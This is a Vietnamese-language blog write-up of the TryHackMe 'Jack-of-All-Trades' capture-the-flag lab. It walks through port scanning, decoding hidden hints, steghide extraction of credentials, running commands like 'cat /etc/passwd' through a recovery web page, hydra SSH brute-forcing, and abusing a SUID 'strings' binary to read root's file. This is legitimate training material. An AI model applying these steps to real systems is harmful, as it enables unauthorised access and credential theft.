---
layout: post
author: "Neo"
title: "Tryhackme - Jack-of-All-Trades"
date: "2022-03-20"
tags: [
    "tryhackme",
    "web",
    "linux",
    "steghide",
    "hydra",
    "gtfobins",
    "ssh",
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2022-03-20-THM-Jack-of-All-Trades/1.webp)

Xin chào, lại là tôi đây. Hôm nay tôi sẽ giải CTF [TryHackMe | Jack-of-All-Trades](https://tryhackme.com/room/jackofalltrades)
## Reconnaissance

Vẫn như thông thường, việc đầu tiên cần làm là quét các cổng đang mở trên máy chủ mục tiêu

```python
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Jack-of-all-trades!
|_http-server-header: Apache/2.4.10 (Debian)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13b7f0a114e2d32540ff4b9460c5003d (DSA)
|   2048 910cd643d940c388b1be350bbcb99088 (RSA)
|   256 a3fb09fb5080718f931f8d43971edcab (ECDSA)
|_  256 6521e74e7c5ae7bcc6ff68caf1cb75e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Truy cập web với port 22. 

```python
┌──(neo㉿kali)-[~]
└─$ curl -s http://10.10.212.34:22
<html>
        <head>
                <title>Jack-of-all-trades!</title>
                <link href="assets/style.css" rel=stylesheet type=text/css>
        </head>
        <body>
                <img id="header" src="assets/header.jpg" width=100%>
                <h1>Welcome to Jack-of-all-trades!</h1>
                <main>
                        <p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
                        <p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
                        <p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
                        <p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
                        <img src="assets/stego.jpg">
                        <p>I make a lot of models myself, but I also do toys, like this one:</p>
                        <img src="assets/jackinthebox.jpg">
                        <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
                        <!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
                        <p>I hope you choose to employ me. I love making new friends!</p>
                        <p>Hope to see you soon!</p>
                        <p id="signature">Jack</p>
                </main>
        </body>
</html>
                                            
┌──(neo㉿kali)-[~]
└─$ 
```

Tôi có 1 đoạn code base64 ở đây. Giải mã nó thì tôi được 1 lời nhắn

*`Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq`

Tuy nhiên tôi để ý còn có một path nữa khá thú vị là */recovery.php*

```python
┌──(neo㉿kali)-[~]
└─$ curl -s http://10.10.212.34:22/recovery.php

<!DOCTYPE html>
<html>
        <head>
                <title>Recovery Page</title>
                <style>
                        body{
                                text-align: center;
                        }
                </style>
        </head>
        <body>
                <h1>Hello Jack! Did you forget your machine password again?..</h1>
                <form action="/recovery.php" method="POST">
                        <label>Username:</label><br>
                        <input name="user" type="text"><br>
                        <label>Password:</label><br>
                        <input name="pass" type="password"><br>
                        <input type="submit" value="Submit">
                </form>
                <!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
                 
        </body>
</html>
                                             
┌──(neo㉿kali)-[~]
└─$ 
```

Sử dụng *_CyberChef_*

![cyberchef](/assets/img/2022-03-20-THM-Jack-of-All-Trades/2.webp)

Thử link trong phần hint này thì đó là wiki về Stegosauria - 1 loài khủng long. Khi đọc đến Steg tôi đã nghĩ đến `steghide`, tôi sẽ tải tất cả các ảnh có trên web về và thử extract nó bằng `steghide`, còn passphrase thì tôi sẽ thử với đoạn code vừa tìm được phía trên.

![assets](/assets/img/2022-03-20-THM-Jack-of-All-Trades/3.webp)

`stego.jpg`

```python
┌──(neo㉿kali)-[~]
└─$ steghide extract -sf stego.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".
                                            
┌──(neo㉿kali)-[~]
└─$ cat creds.txt                                                                
Hehe. Gotcha!

You're on the right path, but wrong image!
```

`jackinthebox.jpg`

```python
┌──(neo㉿kali)-[~]
└─$ steghide extract -sf jackinthebox.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

`header.jpg`

```python
┌──(neo㉿kali)-[~]
└─$ steghide extract -sf header.jpg      
Enter passphrase: 
wrote extracted data to "cms.creds".
                                            
┌──(neo㉿kali)-[~]
└─$ cat cms.creds                                                    
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
                                            
┌──(neo㉿kali)-[~]
└─$ 
```

Quay trở lại path */recovery.php* và login thử

![recovery](/assets/img/2022-03-20-THM-Jack-of-All-Trades/4.webp)

Theo như lời nhắn, tôi sẽ thử 1 cmd đơn giản như thế này

![cmd](/assets/img/2022-03-20-THM-Jack-of-All-Trades/5.webp)

Khi thử `cat /etc/passwd`, tôi để ý thấy url sẽ bị mã hóa rồi sau đó mới trả về kết quả, điều này có nghĩa là để command được thực thi thì tôi phải chuyển nó về url encode

![url encode](/assets/img/2022-03-20-THM-Jack-of-All-Trades/6.webp)

Tạo listener với port 9001 và tạo shell với `bash`. Sau 1 lúc thử các shell thì không RCE được nên tôi quyết định sẽ tìm thủ công.

Trong thư mục */home* có 1 thư mục của user *jack* và 1 file *jacks_password_list*. Khi mở file này thì nó là 1 list các password, tôi sẽ lưu nó về và thử brute-force bằng `hydra` với user *jack*

![password_list](/assets/img/2022-03-20-THM-Jack-of-All-Trades/7.webp)

```python
┌──(neo㉿kali)-[~]
└─$ hydra -l jack -P list.txt ssh://10.10.178.76:80
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-06 09:12:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.10.178.76:80/
[80][ssh] host: 10.10.178.76   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-06 09:13:01
                                           
┌──(neo㉿kali)-[~]
└─$ 
```

Login ssh

```python
┌──(neo㉿kali)-[~]
└─$ ssh jack@10.10.178.76 -p80
jack@10.10.178.76's password: 
jack@jack-of-all-trades:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth),1001(dev)
jack@jack-of-all-trades:~$ ls
user.jpg
jack@jack-of-all-trades:~$ 
```

Tải file ảnh này về và tôi có *user flag*

```python
┌──(neo㉿kali)-[~]
└─$ scp -P 80 jack@10.10.178.76:/home/jack/user.jpg /home/neo
jack@10.10.178.76's password: 
user.jpg                                                   100%  286KB  17.1KB/s   00:16 ┌──(neo㉿kali)-[~]
└─$ scp -P 80 jack@10.10.178.76:/home/jack/user.jpg /home/neo
jack@10.10.178.76's password: 
user.jpg                                                   100%  286KB  17.1KB/s   00:16 
```

## Privilege escalation

`sudo -l` cần có pass của *jack*. Tôi sẽ thử `find`

```python
jack@jack-of-all-trades:~$ find / -type f -perm -u=s 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
```

[strings | GTFOBins](https://gtfobins.github.io/gtfobins/strings/#file-read)

```python
jack@jack-of-all-trades:~$ LFILE=/root/root.txt
jack@jack-of-all-trades:~$ strings "$LFILE"
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f12*********************10a}
```



